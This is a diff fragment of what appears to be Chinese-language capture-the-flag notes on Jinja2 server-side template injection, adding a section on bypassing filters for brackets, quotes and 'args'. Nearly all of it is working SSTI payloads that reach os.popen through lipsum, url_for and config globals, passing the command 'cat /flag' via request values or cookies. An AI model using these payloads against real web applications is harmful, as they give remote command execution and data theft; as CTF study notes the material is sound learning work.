@@ -184,3 +184,21 @@ array.pop(0)
 cookie传参：
 a=os;b=popen;c=cat /flag
 ```
+
+
+^
+## **过滤[]绕过**
+现单双引号、args、[]被过滤
+```
+# values 没有被过滤
+?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
+
+# cookie 可以使用
+?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
+Cookie:c=cat /flag
+```
+
+```
+?name={{config.__str__().__getitem__(22)}}   # 就是22
+
+```
